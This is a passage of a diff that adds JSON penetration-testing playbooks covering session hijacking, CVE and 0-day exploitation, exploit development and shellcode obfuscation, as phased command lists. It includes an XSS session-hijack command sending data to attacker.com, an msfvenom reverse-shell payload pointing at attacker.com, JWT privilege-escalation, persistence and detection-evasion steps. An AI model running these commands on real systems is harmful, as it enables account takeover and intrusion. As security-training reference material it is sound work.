+            "command": "frida -U -f com.target.app -l extract_tokens.js > ~/pt-journal-sessions/*/evidence/mobile_tokens.txt"
+          },
+          {
+            "title": "API Session Enumeration",
+            "details": "Identify API authentication mechanisms and tokens",
+            "command": "python3 api_token_enum.py --target api.target.com --endpoints endpoints.txt --output ~/pt-journal-sessions/*/evidence/api_tokens.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Token Analysis & Validation",
+        "steps": [
+          {
+            "title": "JWT Token Analysis",
+            "details": "Analyze JWT tokens for cryptographic weaknesses",
+            "command": "python3 jwt_tool.py JWT_TOKEN -I -a HS256 -c /path/to/cert.pem"
+          },
+          {
+            "title": "Session Cookie Analysis",
+            "details": "Analyze session cookies for predictability and weaknesses",
+            "command": "python3 cookie_analyzer.py --cookies cookies.txt --entropy-check --pattern-analysis"
+          },
+          {
+            "title": "Token Validation Testing",
+            "details": "Test token validation mechanisms for bypass opportunities",
+            "command": "python3 token_validation_test.py --target target.com --token-type jwt --bypass-tests"
+          },
+          {
+            "title": "Session Fixation Testing",
+            "details": "Test for session fixation vulnerabilities",
+            "command": "python3 session_fixation_test.py --target target.com --login-endpoint /login"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Token Manipulation & Hijacking",
+        "steps": [
+          {
+            "title": "Session Token Replay",
+            "details": "Replay captured session tokens for unauthorized access",
+            "command": "curl -H 'Cookie: SESSION_ID=captured_token' https://target.com/protected/resource"
+          },
+          {
+            "title": "JWT Token Manipulation",
+            "details": "Manipulate JWT claims to escalate privileges",
+            "command": "python3 jwt_tool.py JWT_TOKEN -I -p -d '{\"role\": \"admin\", \"permissions\": [\"all\"]}'"
+          },
+          {
+            "title": "OAuth Token Abuse",
+            "details": "Abuse OAuth tokens for unauthorized API access",
+            "command": "python3 oauth_abuse.py --token oauth_token --api-endpoint https://api.target.com/v1/"
+          },
+          {
+            "title": "Cross-Site Session Hijacking",
+            "details": "Implement XSS-based session hijacking",
+            "command": "python3 xss_session_hijack.py --target target.com --payload-type stored --exfiltrate-to https://attacker.com/collect"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Session Persistence & Evasion",
+        "steps": [
+          {
+            "title": "Session Token Injection",
+            "details": "Inject persistent session tokens for long-term access",
+            "command": "python3 session_inject.py --target target.com --token persistent_token --injection-point cookie"
+          },
+          {
+            "title": "Token Refresh Chain",
+            "details": "Implement token refresh chain for continuous access",
+            "command": "python3 token_refresh_chain.py --refresh-endpoint /auth/refresh --initial-token token --output ~/pt-journal-sessions/*/evidence/refresh_chain.txt"
+          },
+          {
+            "title": "Session State Manipulation",
+            "details": "Manipulate server-side session state for privilege escalation",
+            "command": "python3 session_state_manipulation.py --target target.com --session-id session_id --desired-state admin"
+          },
+          {
+            "title": "Anti-Detection Evasion",
+            "details": "Implement techniques to evade session hijacking detection",
+            "command": "python3 session_evasion.py --target target.com --stealth-mode rotate-user-agent --timing human-like"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Web Application Session Hijacking Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Token Discovery",
+            "description": "Capture and analyze session tokens from multiple sources",
+            "command": "tshark -i eth0 -Y 'http.cookie' -w ~/pt-journal-sessions/*/evidence/traffic.pcap && python3 browser_dump.py --profile default"
+          },
+          {
+            "label": "Day 2: Token Analysis",
+            "description": "Analyze captured tokens for vulnerabilities",
+            "command": "python3 analyze_tokens.py --input ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/vulnerabilities.txt"
+          },
+          {
+            "label": "Day 3: Exploitation",
+            "description": "Exploit token vulnerabilities for unauthorized access",
+            "command": "python3 exploit_tokens.py --vulnerabilities ~/pt-journal-sessions/*/evidence/vulnerabilities.txt --target target.com"
+          },
+          {
+            "label": "Day 4: Persistence",
+            "description": "Establish persistent session access",
+            "command": "python3 establish_persistence.py --compromised-tokens tokens.txt --persistence-method refresh-chain"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "JWT token with 'none' algorithm",
+        "meaning": "Critical vulnerability allowing token forgery",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Session cookie with sequential pattern",
+        "meaning": "Predictable session IDs vulnerable to brute force",
+        "severity": "High"
+      },
+      {
+        "indicator": "OAuth token with excessive scopes",
+        "meaning": "Over-privileged token providing broad access",
+        "severity": "High"
+      },
+      {
+        "indicator": "Session fixation successful",
+        "meaning": "Ability to set user session before authentication",
+        "severity": "High"
+      },
+      {
+        "indicator": "Token replay accepted",
+        "meaning": "Lack of nonce/timestamp validation in tokens",
+        "severity": "Medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Custom Token Manipulation",
+        "scenario": "Develop custom token manipulation scripts for proprietary formats",
+        "command": "python3 custom_token_toolkit.py --format proprietary --input token.bin --manipulation escalate-privileges",
+        "notes": [
+          "Reverse engineer proprietary token formats before manipulation"
+        ]
+      },
+      {
+        "title": "Distributed Session Hijacking",
+        "scenario": "Coordinate session hijacking across multiple compromised systems",
+        "command": "python3 distributed_hijack.py --nodes compromised_hosts.txt --target-api api.target.com --synchronize-sessions",
+        "notes": [
+          "Maintain session synchronization across distributed nodes"
+        ]
+      },
+      {
+        "title": "AI-Powered Token Prediction",
+        "scenario": "Use machine learning to predict sequential session tokens",
+        "command": "python3 token_predictor.py --training-data captured_tokens.txt --model lstm --predict-next 100",
+        "notes": [
+          "Train models on sufficient token samples for accurate prediction"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Session Hijacking Tools Comparison",
+      "columns": ["Tool", "Token Types", "Network Analysis", "Automation", "Stealth"],
+      "rows": [
+        ["Burp Suite", "Web tokens", "Excellent", "High", "Medium"],
+        ["OWASP ZAP", "Web tokens", "Good", "High", "Medium"],
+        ["Bettercap", "All types", "Excellent", "Medium", "High"],
+        ["JWT Tool", "JWT only", "None", "High", "High"],
+        ["Custom Scripts", "Any", "Variable", "Very High", "Very High"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "OWASP Session Management Cheat Sheet",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
+        "description": "Comprehensive guide to session management vulnerabilities"
+      },
+      {
+        "label": "JWT Security Best Practices",
+        "url": "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
+        "description": "JWT security vulnerabilities and prevention techniques"
+      },
+      {
+        "label": "Session Hijacking Legal Framework",
+        "url": "https://www.sans.org/white-papers/36846/",
+        "description": "Legal considerations for session hijacking testing"
+      }
+    ]
+  },
+  {
+    "id": "playbook_zero_day_cve_exploitation",
+    "name": "0-Day/CVE Exploitation Pipeline",
+    "summary": "Comprehensive vulnerability exploitation playbook covering CVE discovery, exploit development, and 0-day vulnerability research workflows.",
+    "details": "This playbook provides end-to-end coverage of vulnerability exploitation from CVE research to 0-day discovery and exploit development. Includes vulnerability analysis, exploit chaining, and strategic deployment. Features decision trees for exploit selection, target prioritization, and impact assessment.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Vulnerability research and exploitation tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y gdb radare2 pwntools binary-ninja-community",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install pwntools ropper angr capstone keystone-engine",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/exploit-development/exploit-dev-toolkit.git && cd exploit-dev-toolkit && pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/GDSSecurity/Windows-Exploit-Suggester/archive/master.zip && unzip master.zip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete exploit development environment",
+        "steps": [
+          {
+            "detail": "sudo apt install -y gdb radare2 pwntools ropper angr binary-ninja",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y exploitdb searchsploit metasploit-framework",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install keystone-engine capstone unicorn z3-solver",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized exploit development environment",
+        "steps": [
+          {
+            "detail": "docker pull pwntools/pwntools",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull radareorg/radare2",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwntools/pwntools",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "CVE vulnerability lookup",
+        "command": "searchsploit CVE-2024-1234 && echo 'CVE details and exploits found'",
+        "notes": [
+          "Search for existing exploits before developing new ones"
+        ]
+      },
+      {
+        "description": "Binary vulnerability analysis",
+        "command": "r2 -A ~/pt-journal-sessions/*/evidence/vulnerable_binary && aaa && pdf@@sym && pdf@@imports",
+        "notes": [
+          "Use radare2 for comprehensive binary analysis"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Vulnerability Discovery",
+        "steps": [
+          {
+            "title": "CVE Intelligence Gathering",
+            "details": "Monitor new CVE disclosures and assess exploitability",
+            "command": "python3 cve_monitor.py --sources nvd,cve,exploitdb --severity critical,high --output ~/pt-journal-sessions/*/evidence/cve_feed.txt"
+          },
+          {
+            "title": "Target System Fingerprinting",
+            "details": "Identify vulnerable software versions and configurations",
+            "command": "nmap -sV --script vuln target.com -o ~/pt-journal-sessions/*/evidence/vuln_scan.txt"
+          },
+          {
+            "title": "0-Day Research Setup",
+            "details": "Set up environment for novel vulnerability research",
+            "command": "python3 research_setup.py --target-type web_app --fuzzing-tools afl,libfuzzer --analysis-tools angr,symbolic"
+          },
+          {
+            "title": "Vulnerability Scanning",
+            "details": "Comprehensive vulnerability assessment",
+            "command": "nuclei -l targets.txt -t cves/ -o ~/pt-journal-sessions/*/evidence/nuclei_cves.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Vulnerability Analysis",
+        "steps": [
+          {
+            "title": "Binary Reverse Engineering",
+            "details": "Analyze binary code for vulnerability patterns",
+            "command": "r2 -A ~/pt-journal-sessions/*/evidence/target_binary && 'afl~pattern' && 'pdf~*'"
+          },
+          {
+            "title": "Static Code Analysis",
+            "details": "Analyze source code for security flaws",
+            "command": "python3 static_analysis.py --source target_app/ --patterns buffer_overflow,sql_injection,xss --output ~/pt-journal-sessions/*/evidence/static_vulns.txt"
+          },
+          {
+            "title": "Dynamic Analysis Setup",
+            "details": "Configure dynamic analysis environment",
+            "command": "gdb ~/pt-journal-sessions/*/evidence/target_binary -ex 'set disassembly-flavor intel' -ex 'layout asm'"
+          },
+          {
+            "title": "Fuzzing Campaign",
+            "details": "Automated fuzzing for vulnerability discovery",
+            "command": "afl-fuzz -i input_dir -o ~/pt-journal-sessions/*/evidence/fuzz_results/ -M fuzzer01 ~/pt-journal-sessions/*/evidence/target_binary @@"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Exploit Development",
+        "steps": [
+          {
+            "title": "Exploit Template Generation",
+            "details": "Generate exploit templates based on vulnerability type",
+            "command": "python3 exploit_template.py --vuln-type buffer_overflow --arch x64 --template python"
+          },
+          {
+            "title": "Shellcode Development",
+            "details": "Develop custom shellcode for target platform",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f python -o ~/pt-journal-sessions/*/evidence/shellcode.py"
+          },
+          {
+            "title": "Exploit Testing",
+            "details": "Test exploit against isolated target environment",
+            "command": "python3 exploit.py --target 192.168.1.100 --port 8080 --debug --payload ~/pt-journal-sessions/*/evidence/shellcode.py"
+          },
+          {
+            "title": "Exploit Optimization",
+            "details": "Optimize exploit for reliability and stealth",
+            "command": "python3 optimize_exploit.py --input exploit.py --optimizations reliability,stealth,size"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Strategic Deployment",
+        "steps": [
+          {
+            "title": "Attack Vector Selection",
+            "details": "Select optimal attack vector based on target environment",
+            "command": "python3 vector_selector.py --target-info target_analysis.txt --exploits available_exploits.txt --output ~/pt-journal-sessions/*/evidence/selected_vector.txt"
+          },
+          {
+            "title": "Exploit Chaining",
+            "details": "Chain multiple exploits for maximum impact",
+            "command": "python3 exploit_chainer.py --exploits exploit_list.txt --chain-strategy privilege_escalation --output ~/pt-journal-sessions/*/evidence/exploit_chain.py"
+          },
+          {
+            "title": "Impact Assessment",
+            "details": "Assess potential impact and collateral damage",
+            "command": "python3 impact_assessment.py --exploit exploit.py --target-network 192.168.1.0/24 --output ~/pt-journal-sessions/*/evidence/impact_report.txt"
+          },
+          {
+            "title": "Coordinated Deployment",
+            "details": "Deploy exploit with timing and coordination",
+            "command": "python3 deploy_exploit.py --exploit exploit_chain.py --target-list targets.txt --timing stealth --backup-exit"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "CVE Exploitation Research Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: CVE Monitoring",
+            "description": "Monitor new CVE disclosures and assess relevance",
+            "command": "python3 cve_monitor.py --severity critical --target-software apache,nginx --output ~/pt-journal-sessions/*/evidence/relevant_cves.txt"
+          },
+          {
+            "label": "Day 2-3: Vulnerability Analysis",
+            "description": "Analyze target systems for CVE presence",
+            "command": "nmap -sV --script vuln target_network/24 -o ~/pt-journal-sessions/*/evidence/vuln_assessment.txt"
+          },
+          {
+            "label": "Day 4-5: Exploit Development",
+            "description": "Develop or customize exploits for identified vulnerabilities",
+            "command": "python3 develop_exploit.py --cve CVE-2024-1234 --target target.com --shellcode custom"
+          },
+          {
+            "label": "Day 6: Validation & Deployment",
+            "description": "Validate exploit effectiveness and deploy strategically",
+            "command": "python3 validate_deploy.py --exploit exploit.py --target target.com --impact-assessment"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Buffer overflow detected in function X at offset Y",
+        "meaning": "Memory corruption vulnerability exploitable for code execution",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Use-after-free vulnerability identified",
+        "meaning": "Advanced memory corruption requiring sophisticated exploit",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Remote code execution achieved",
+        "meaning": "Successful exploitation providing system access",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Privilege escalation successful",
+        "meaning": "Exploit chain elevated privileges to admin/root",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "0-Day vulnerability discovered",
+        "meaning": "Novel vulnerability requiring responsible disclosure",
+        "severity": "Critical"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Automated Exploit Generation",
+        "scenario": "Use AI/ML for automated exploit development",
+        "command": "python3 ai_exploit_generator.py --vulnerability crash_dump.bin --target-arch x64 --output auto_exploit.py",
+        "notes": [
+          "Validate generated exploits thoroughly before deployment"
+        ]
+      },
+      {
+        "title": "Advanced Fuzzing Techniques",
+        "scenario": "Implement coverage-guided and symbolic execution fuzzing",
+        "command": "afl-fuzz -i input/ -o output/ -M main -d ~/pt-journal-sessions/*/evidence/target_binary @@ && python3 symbolic_fuzz.py --target binary --constraints constraints.txt",
+        "notes": [
+          "Combine multiple fuzzing approaches for comprehensive coverage"
+        ]
+      },
+      {
+        "title": "Exploit Obfuscation",
+        "scenario": "Develop anti-analysis and evasion techniques",
+        "command": "python3 exploit_obfuscator.py --input exploit.py --techniques polymorphism,anti-debug,encryption --output obfuscated_exploit.py",
+        "notes": [
+          "Test obfuscated exploits against security solutions"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Exploitation Tools Comparison",
+      "columns": ["Tool", "Vulnerability Types", "Automation", "Learning Curve", "Effectiveness"],
+      "rows": [
+        ["Metasploit", "Known CVEs", "High", "Low", "High"],
+        ["Pwntools", "Custom", "Medium", "Medium", "Very High"],
+        ["Radare2", "Binary Analysis", "Low", "High", "Very High"],
+        ["AFL", "Fuzzing", "High", "Medium", "High"],
+        ["Custom Frameworks", "Any", "Variable", "Very High", "Variable"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "CVE Database",
+        "url": "https://cve.mitre.org/",
+        "description": "Official CVE database and vulnerability information"
+      },
+      {
+        "label": "Exploit Database",
+        "url": "https://www.exploit-db.com/",
+        "description": "Comprehensive archive of exploits and vulnerability research"
+      },
+      {
+        "label": "Responsible Disclosure Guidelines",
+        "url": "https://vuls.cert.org/confluence/display/RD",
+        "description": "Industry guidelines for responsible vulnerability disclosure"
+      }
+    ]
+  },
+  {
+    "id": "playbook_exploit_development_workflow",
+    "name": "Exploit Development Workflow",
+    "summary": "Systematic exploit development methodology covering vulnerability research, payload development, and reliability engineering.",
+    "details": "This playbook provides a comprehensive framework for exploit development from vulnerability discovery to reliable deployment. Covers reverse engineering, shellcode development, exploit stability testing, and multi-platform compatibility. Includes decision trees for exploit strategy selection and optimization techniques.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Exploit development and reverse engineering tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y gdb gdb-multiarch radare2 pwntools",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install pwntools ropper angr capstone keystone-engine unicorn",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/JonathanSalwan/ROPgadget.git && cd ROPgadget && python3 setup.py install",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/zodiacon/WinAppDbg/releases/download/v1.6/WinAppDbg.zip && unzip WinAppDbg.zip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete exploit development environment",
+        "steps": [
+          {
+            "detail": "sudo apt install -y gdb radare2 pwntools ropper angr keystone-engine",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y gef gdb-peda pwndbg binary-ninja-community",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install unicorn z3-solver fileformat pefile",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized exploit development environment",
+        "steps": [
+          {
+            "detail": "docker pull pwntools/pwntools",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull radareorg/radare2",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -v $(pwd)/exploits:/exploits pwntools/pwntools",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick ROP chain generation",
+        "command": "ROPgadget --binary ~/pt-journal-sessions/*/evidence/target_binary --ropchain",
+        "notes": [
+          "Automatically generate ROP chains for bypassing DEP/NX"
+        ]
+      },
+      {
+        "description": "Pattern offset calculation",
+        "command": "python3 -c 'from pwn import *; print(cyclic(100).find(b\"AAAABBBB\"))'",
+        "notes": [
+          "Calculate offset for buffer overflow vulnerabilities"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Vulnerability Analysis",
+        "steps": [
+          {
+            "title": "Crash Reproduction",
+            "details": "Reproduce and analyze the vulnerability crash",
+            "command": "gdb ~/pt-journal-sessions/*/evidence/vulnerable_binary -ex 'run input_file' -ex 'bt' -ex 'info registers'"
+          },
+          {
+            "title": "Memory Layout Analysis",
+            "details": "Analyze memory layout and protection mechanisms",
+            "command": "python3 memory_analyzer.py --binary target_binary --protections nx,aslr,canary --output ~/pt-journal-sessions/*/evidence/memory_layout.txt"
+          },
+          {
+            "title": "Control Flow Analysis",
+            "details": "Analyze control flow and identify exploitation primitives",
+            "command": "r2 -AA ~/pt-journal-sessions/*/evidence/target_binary && 'afl~call' && 'pdf~jump'"
+          },
+          {
+            "title": "Information Leak Identification",
+            "details": "Identify information leaks for bypassing protections",
+            "command": "python3 info_leak_scanner.py --binary target_binary --output ~/pt-journal-sessions/*/evidence/info_leaks.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Exploit Strategy Development",
+        "steps": [
+          {
+            "title": "Exploit Primitive Selection",
+            "details": "Select optimal exploitation primitives based on analysis",
+            "command": "python3 exploit_strategist.py --vulnerability buffer_overflow --protections nx,aslr --output ~/pt-journal-sessions/*/evidence/exploit_strategy.txt"
+          },
+          {
+            "title": "ROP Chain Development",
+            "details": "Develop ROP chains for bypassing DEP/NX protections",
+            "command": "ROPgadget --binary target_binary --ropchain --output ~/pt-journal-sessions/*/evidence/rop_chain.txt"
+          },
+          {
+            "title": "Shellcode Development",
+            "details": "Develop custom shellcode for the target platform",
+            "command": "msfvenom -p linux/x64/exec CMD=/bin/sh -f python -o ~/pt-journal-sessions/*/evidence/shellcode.py"
+          },
+          {
+            "title": "Bypass Technique Selection",
+            "details": "Select techniques for bypassing security protections",
+            "command": "python3 bypass_selector.py --protections canary,aslr,nx --techniques ret2libc,rop,info_leak"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Exploit Implementation",
+        "steps": [
+          {
+            "title": "Exploit Template Creation",
+            "details": "Create exploit template with Pwntools framework",
+            "command": "python3 exploit_template.py --vuln-type buffer_overflow --arch x64 --template pwntools --output exploit.py"
+          },
+          {
+            "title": "Payload Integration",
+            "details": "Integrate shellcode and ROP chains into exploit",
+            "command": "python3 payload_integrator.py --exploit exploit.py --shellcode shellcode.py --rop-chain rop_chain.txt"
+          },
+          {
+            "title": "Address Leak Implementation",
+            "details": "Implement address leak techniques for ASLR bypass",
+            "command": "python3 address_leak.py --exploit exploit.py --leak-method format_string --output final_exploit.py"
+          },
+          {
+            "title": "Multi-Platform Compatibility",
+            "details": "Ensure exploit works across different platforms/versions",
+            "command": "python3 compat_tester.py --exploit final_exploit.py --platforms ubuntu18,ubuntu20,ubuntu22 --output ~/pt-journal-sessions/*/evidence/compatibility.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Reliability & Optimization",
+        "steps": [
+          {
+            "title": "Exploit Stability Testing",
+            "details": "Test exploit reliability across multiple runs",
+            "command": "python3 stability_tester.py --exploit final_exploit.py --iterations 100 --output ~/pt-journal-sessions/*/evidence/stability_report.txt"
+          },
+          {
+            "title": "Race Condition Handling",
+            "details": "Handle race conditions and timing issues",
+            "command": "python3 race_handler.py --exploit final_exploit.py --timing-adjustments --output stable_exploit.py"
+          },
+          {
+            "title": "Error Recovery Implementation",
+            "details": "Implement error recovery and fallback mechanisms",
+            "command": "python3 error_recovery.py --exploit stable_exploit.py --fallback-strategies --output robust_exploit.py"
+          },
+          {
+            "title": "Performance Optimization",
+            "details": "Optimize exploit for speed and stealth",
+            "command": "python3 optimize_exploit.py --input robust_exploit.py --optimizations speed,stealth,size --output final_exploit.py"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Professional Exploit Development Pipeline",
+        "stages": [
+          {
+            "label": "Day 1-2: Vulnerability Analysis",
+            "description": "Comprehensive vulnerability and target analysis",
+            "command": "gdb ~/pt-journal-sessions/*/evidence/target_binary -ex 'run crash_input' -ex 'bt full' -ex 'x/20x $esp' > ~/pt-journal-sessions/*/evidence/crash_analysis.txt"
+          },
+          {
+            "label": "Day 3-4: Strategy Development",
+            "description": "Develop exploitation strategy and primitives",
+            "command": "python3 exploit_strategist.py --input ~/pt-journal-sessions/*/evidence/crash_analysis.txt --output ~/pt-journal-sessions/*/evidence/strategy.txt"
+          },
+          {
+            "label": "Day 5-6: Exploit Implementation",
+            "description": "Implement exploit with all bypass techniques",
+            "command": "python3 exploit_builder.py --strategy ~/pt-journal-sessions/*/evidence/strategy.txt --output exploit.py"
+          },
+          {
+            "label": "Day 7: Testing & Optimization",
+            "description": "Test reliability and optimize for production",
+            "command": "python3 optimize_exploit.py --input exploit.py --test-reliability 50 --optimize-all"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Control of instruction pointer (EIP/RIP) achieved",
+        "meaning": "Successful control flow hijacking, ready for shellcode execution",
+        "severity": "High"
+      },
+      {
+        "indicator": "ASLR bypass successful with information leak",
+        "meaning": "Memory randomization defeated, exploit reliable",
+        "severity": "High"
+      },
+      {
+        "indicator": "DEP/NX bypassed with ROP chain",
+        "meaning": "Data execution prevention bypassed, code execution possible",
+        "severity": "High"
+      },
+      {
+        "indicator": "Stack canary bypassed",
+        "meaning": "Stack protection defeated, buffer overflow exploitable",
+        "severity": "High"
+      },
+      {
+        "indicator": "Exploit reliability: 95%+ success rate",
+        "meaning": "Exploit is production-ready and stable",
+        "severity": "Medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Automated Exploit Generation",
+        "scenario": "Use symbolic execution for automated exploit generation",
+        "command": "python3 symbolic_exploit.py --binary target_binary --crash_input crash.bin --output auto_exploit.py",
+        "notes": [
+          "Symbolic execution can automatically discover exploitation paths"
+        ]
+      },
+      {
+        "title": "Multi-Architecture Exploits",
+        "scenario": "Develop exploits that work across multiple architectures",
+        "command": "python3 multi_arch_exploit.py --target binary --architectures x86,x64,arm --output universal_exploit.py",
+        "notes": [
+          "Test thoroughly on all target architectures"
+        ]
+      },
+      {
+        "title": "Advanced Bypass Techniques",
+        "scenario": "Implement advanced bypass techniques for modern protections",
+        "command": "python3 advanced_bypass.py --exploit base_exploit.py --techniques ret2csu,partial_overwrite,sigreturn --output advanced_exploit.py",
+        "notes": [
+          "Advanced techniques require deep system knowledge"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Exploit Development Tools Comparison",
+      "columns": ["Tool", "Language", "Learning Curve", "Features", "Reliability"],
+      "rows": [
+        ["Pwntools", "Python", "Medium", "Comprehensive", "High"],
+        ["Pwnlib", "Python", "Medium", "Good", "High"],
+        ["ROPgadget", "Python", "Low", "ROP-focused", "Medium"],
+        ["Custom Frameworks", "Any", "High", "Complete", "Variable"],
+        ["Metasploit", "Ruby", "Low", "Standardized", "Very High"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Exploit Development Tutorial",
+        "url": "https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/",
+        "description": "Comprehensive exploit development tutorial series"
+      },
+      {
+        "label": "Pwntools Documentation",
+        "url": "https://pwntools.readthedocs.io/",
+        "description": "Complete documentation for Pwntools exploit development framework"
+      },
+      {
+        "label": "Modern Binary Exploitation Course",
+        "url": "https://github.com/RPISEC/MBE",
+        "description": "University-level binary exploitation course materials"
+      }
+    ]
+  },
+  {
+    "id": "playbook_shellcode_creation_obfuscation",
+    "name": "Shellcode Creation & Obfuscation",
+    "summary": "Advanced shellcode development and obfuscation playbook covering custom shellcode, polymorphic techniques, and evasion strategies.",
+    "details": "This playbook provides comprehensive coverage of shellcode development from basic assembly to advanced polymorphic techniques. Includes custom shellcode creation, encoding/encryption, anti-analysis techniques, and multi-platform compatibility. Features decision trees for shellcode optimization and evasion strategy selection.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Shellcode development and assembly tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y nasm yasm gdb-multiarch",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install keystone-engine capstone unicorn pwntools",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/aerosol-can/Shellcodify.git && cd Shellcodify && python3 setup.py install",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/rapid7/metasploit-framework/archive/master.zip && unzip master.zip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete shellcode development environment",
+        "steps": [
+          {
+            "detail": "sudo apt install -y nasm yasm keystone-framework capstone-toolkit",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y metasploit-framework pwntools libemu-dev",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install shellcode-tools scdbg unicorn",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized shellcode development environment",
+        "steps": [
+          {
+            "detail": "docker pull keystone/keystone",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull capstone-engine/capstone",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it -v $(pwd)/shellcode:/shellcode keystone/keystone bash",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick shellcode assembly",
+        "command": "nasm -f bin64 shellcode.asm -o shellcode.bin && objdump -D -b binary -mi386:x86-64 shellcode.bin",
+        "notes": [
+          "Assemble shellcode and verify with objdump"
+        ]
+      },
+      {
+        "description": "Shellcode encoding with msfvenom",
+        "command": "msfvenom -p linux/x64/exec CMD=/bin/sh -f raw -e x64/shikata_ga_nai -o encoded_shellcode.bin",
+        "notes": [
+          "Encode shellcode to avoid signature detection"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Shellcode Development",
+        "steps": [
+          {
+            "title": "Assembly Shellcode Creation",
+            "details": "Create shellcode from assembly source",
+            "command": "nasm -f bin64 shellcode.asm -o shellcode.bin && python3 shellcode_extractor.py --binary shellcode.bin --output ~/pt-journal-sessions/*/evidence/raw_shellcode.bin"
+          },
+          {
+            "title": "Position-Independent Shellcode",
+            "details": "Develop position-independent shellcode",
+            "command": "python3 pic_shellcode.py --assembly shellcode.asm --output ~/pt-journal-sessions/*/evidence/pic_shellcode.bin"
+          },
+          {
+            "title": "System Call Optimization",
+            "details": "Optimize shellcode for minimal system calls",
+            "command": "python3 syscall_optimizer.py --shellcode raw_shellcode.bin --target linux_x64 --output ~/pt-journal-sessions/*/evidence/optimized_shellcode.bin"
+          },
+          {
+            "title": "Null-Free Shellcode",
+            "details": "Remove null bytes from shellcode",
+            "command": "python3 null_remover.py --input shellcode.bin --output ~/pt-journal-sessions/*/evidence/nullfree_shellcode.bin"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Shellcode Encoding & Encryption",
+        "steps": [
+          {
+            "title": "Polymorphic Encoding",
